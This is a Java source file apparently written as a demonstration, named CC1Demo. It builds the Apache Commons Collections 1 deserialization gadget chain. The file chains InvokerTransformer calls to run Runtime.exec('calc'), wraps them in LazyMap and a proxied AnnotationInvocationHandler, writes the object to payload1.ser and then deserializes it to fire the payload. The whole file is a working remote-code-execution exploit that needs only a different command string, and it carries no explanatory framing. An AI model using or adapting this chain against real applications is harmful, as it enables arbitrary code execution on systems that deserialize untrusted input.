import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.functors.ChainedTransformer;


public class CC1Demo {
    public static void main (String[] args) throws Exception {
     
        ConstantTransformer c=new ConstantTransformer(Runtime.class);
        InvokerTransformer i1=new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime", new Class[0]});
        InvokerTransformer i2=new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, new Object[0]});
        InvokerTransformer i3=new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        Transformer[] ts=new Transformer[]{c,i1,i2,i3};
        ChainedTransformer chain=new ChainedTransformer(ts);

     
        HashMap<String, String> innermap=new HashMap<String, String>();
        Map<String,String> lazyMap=LazyMap.decorate(innermap, chain);




        Class<?> clazz=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> cons=clazz.getDeclaredConstructor(Class.class,Map.class);
        cons.setAccessible(true);
        Object h1=cons.newInstance(Override.class,lazyMap);
        InvocationHandler handler1=(InvocationHandler)h1;




        Map proxymap=(Map)java.lang.reflect.Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler1);

        InvocationHandler handler2=(InvocationHandler)cons.newInstance(Override.class,proxymap);
        



        FileOutputStream fos=new FileOutputStream("payload1.ser");
        ObjectOutputStream oos=new ObjectOutputStream(fos);
        oos.writeObject(handler2);
        oos.flush();
        oos.close();
        fos.close();



    
        FileInputStream fis=new FileInputStream("payload1.ser");
        ObjectInputStream ois=new ObjectInputStream(fis);
        ois.readObject();
        ois.close();
        fis.close();



    }

}
